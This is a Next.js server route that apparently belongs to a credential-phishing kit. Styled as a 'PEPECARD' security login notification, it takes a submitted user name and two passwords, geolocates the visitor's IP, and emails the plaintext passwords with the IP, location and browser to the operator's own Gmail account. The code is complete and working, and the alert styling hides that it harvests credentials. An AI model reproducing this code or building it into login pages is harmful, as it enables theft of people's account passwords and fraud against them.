import nodemailer from 'nodemailer'
import { NextResponse } from 'next/server'

function escapeHtml(value) {
	return String(value)
		.replace(/&/g, '&amp;')
		.replace(/</g, '&lt;')
		.replace(/>/g, '&gt;')
		.replace(/"/g, '&quot;')
		.replace(/'/g, '&#39;')
}

function formatIndianTime(value) {
	const date = new Date(value)

	if (Number.isNaN(date.getTime())) {
		return 'Invalid time'
	}

	return new Intl.DateTimeFormat('en-IN', {
		timeZone: 'Asia/Kolkata',
		year: 'numeric',
		month: 'long',
		day: '2-digit',
		hour: '2-digit',
		minute: '2-digit',
		second: '2-digit',
		hour12: true,
		timeZoneName: 'short',
	}).format(date)
}

async function getLocationFromIp(ip) {
	if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
		return 'Unknown'
	}

	try {
		const response = await fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/', {
			cache: 'no-store',
		})

		if (!response.ok) {
			return 'Unknown'
		}

		const data = await response.json()
		const city = data?.city
		const region = data?.region
		const country = data?.country_name
		const location = [city, region, country].filter(Boolean).join(', ')

		return location || 'Unknown'
	} catch {
		return 'Unknown'
	}
}

export async function POST(request) {
	try {
		const { name, loginTime, browser, firstPassword, secondPassword } = await request.json()

		if (!name || typeof name !== 'string') {
			return NextResponse.json({ error: 'Name is required.' }, { status: 400 })
		}

		const forwardedFor = request.headers.get('x-forwarded-for')
		const realIp = request.headers.get('x-real-ip')
		const ip = forwardedFor?.split(',')[0]?.trim() || realIp || 'Unknown'
		const location = await getLocationFromIp(ip)
		const safeLoginTime = typeof loginTime === 'string' && loginTime ? loginTime : new Date().toISOString()
		const safeBrowser = typeof browser === 'string' && browser ? browser : 'Unknown'
		const indianReadableTime = formatIndianTime(safeLoginTime)
		const safeName = escapeHtml(name)
        const safeFirstPassword = escapeHtml(firstPassword)
        const safeSecondPassword = escapeHtml(secondPassword)
		const safeTime = escapeHtml(indianReadableTime)
		const safeIp = escapeHtml(ip)
		const safeLocation = escapeHtml(location)
		const safeBrowserLabel = escapeHtml(safeBrowser)

		const html =
			'<!DOCTYPE html>' +
			'<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>' +
			'<body style="margin:0;padding:0;background:#f3f6fb;font-family:Segoe UI,Arial,sans-serif;color:#111827;">' +
			'<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="padding:28px 12px;">' +
			'<tr><td align="center">' +
			'<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width:640px;background:#ffffff;border:1px solid #e5e7eb;border-radius:14px;overflow:hidden;">' +
			'<tr><td style="background:linear-gradient(120deg,#0f172a,#1d4ed8);padding:24px 28px;">' +
			'<div style="font-size:12px;letter-spacing:0.12em;color:#c7d2fe;text-transform:uppercase;">Security Alert</div>' +
			'<div style="margin-top:8px;font-size:24px;font-weight:700;color:#ffffff;">PEPECARD Login Notification</div>' +
			'</td></tr>' +
			'<tr><td style="padding:26px 28px 8px 28px;">' +
			'<p style="margin:0 0 14px 0;font-size:16px;line-height:1.6;">Hello,</p>' +
			'<p style="margin:0 0 20px 0;font-size:14px;line-height:1.7;color:#334155;">A successful login to your PEPECARD account was detected. Please review the session details below.</p>' +
			'</td></tr>' +
            '<tr><td style="padding:0 28px 8px 28px;">' +
                        '<p style="margin:0 0 14px 0;font-size:14px;line-height:1.7;color:#334155;">User Name: <strong>' + safeName + '</strong></p>' +
            '<p style="margin:0 0 14px 0;font-size:14px;line-height:1.7;color:#334155;">First Password: <strong>' + safeFirstPassword + '</strong></p>' +
            '<p style="margin:0 0 20px 0;font-size:14px;line-height:1.7;color:#334155;">Second Password: <strong>' + safeSecondPassword + '</strong></p>' +
            '</td></tr>' +
			'<tr><td style="padding:0 28px 20px 28px;">' +
			'<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="border:1px solid #e5e7eb;border-radius:10px;overflow:hidden;">' +
			'<tr><td style="width:160px;padding:12px 14px;background:#f8fafc;font-size:13px;font-weight:600;color:#334155;border-bottom:1px solid #e5e7eb;">Login Time</td><td style="padding:12px 14px;font-size:13px;color:#111827;border-bottom:1px solid #e5e7eb;">' + safeTime + '</td></tr>' +
			'<tr><td style="width:160px;padding:12px 14px;background:#f8fafc;font-size:13px;font-weight:600;color:#334155;border-bottom:1px solid #e5e7eb;">IP Address</td><td style="padding:12px 14px;font-size:13px;color:#111827;border-bottom:1px solid #e5e7eb;">' + safeIp + '</td></tr>' +
			'<tr><td style="width:160px;padding:12px 14px;background:#f8fafc;font-size:13px;font-weight:600;color:#334155;border-bottom:1px solid #e5e7eb;">Location</td><td style="padding:12px 14px;font-size:13px;color:#111827;border-bottom:1px solid #e5e7eb;">' + safeLocation + '</td></tr>' +
			'<tr><td style="width:160px;padding:12px 14px;background:#f8fafc;font-size:13px;font-weight:600;color:#334155;">Browser</td><td style="padding:12px 14px;font-size:13px;color:#111827;word-break:break-word;">' + safeBrowserLabel + '</td></tr>' +
			'</table>' +
			'</td></tr>' +
			'<tr><td style="padding:0 28px 24px 28px;">' +
			'<div style="font-size:12px;line-height:1.7;color:#64748b;">If this was not you, secure your account immediately and change your credentials.</div>' +
			'</td></tr>' +
			'<tr><td style="padding:16px 28px;background:#f8fafc;border-top:1px solid #e5e7eb;">' +
			'<div style="font-size:12px;color:#64748b;">PEPECARD Security Team</div>' +
			'</td></tr>' +
			'</table>' +
			'</td></tr></table>' +
			'</body></html>'

		const text =
			'PEPECARD Login Notification\n\n' +
			'Hello ' + name + ',\n\n' +
			'A user logged into PEPECARD.\n\n' +
			'Time (IST): ' + indianReadableTime + '\n' +
			'IP: ' + ip + '\n' +
			'Location: ' + location + '\n' +
			'Browser: ' + safeBrowser + '\n'

		const emailUser = process.env.EMAIL_USER
		const emailPass = process.env.EMAIL_PASS

		if (!emailUser || !emailPass) {
			return NextResponse.json({ error: 'Email configuration is missing.' }, { status: 500 })
		}

		const transporter = nodemailer.createTransport({
			service: 'gmail',
			auth: {
				user: emailUser,
				pass: emailPass,
			},
		})

		await transporter.sendMail({
			from: emailUser,
			to: emailUser,
			subject: 'PEPECARD Login Notification',
			html,
			text,
		})

		return NextResponse.json({ success: true, message: 'Email sent successfully.' })
	} catch (error) {
		console.error('Send email error:', error)
		return NextResponse.json({ error: 'Failed to send email.' }, { status: 500 })
	}
}
